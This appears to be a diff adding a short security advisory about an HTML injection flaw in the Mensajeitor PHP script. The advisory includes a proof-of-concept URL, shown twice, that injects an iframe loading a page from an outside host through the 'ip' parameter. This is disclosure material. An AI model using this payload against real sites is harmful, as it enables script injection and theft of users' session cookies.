@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/14071/info
+
+Mensajeitor is prone to an HTML injection vulnerability. This issue is due to a failure in the application to properly sanitize user-supplied input before using it in dynamically generated content.
+
+Attacker-supplied HTML and script code would be executed in the context of the affected Web site, potentially allowing for theft of cookie-based authentication credentials. An attacker could also exploit this issue to control how the site is rendered to the user; other attacks are also possible. 
+
+http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip='aa'>%3Ciframe%20src=http://mbytesecurity.org/bukle.htm&enviar
+=Enviar
+<http://www.example.com/mensajeitor.php?nick=megabyte&url=http://mbytesecurity.org&actualizar=null&titulo=aaa&ip=%27aa%27%3E%3Ciframe%20src=http://mbytesecurity.org/bukle.htm
+&enviar=Enviar> 
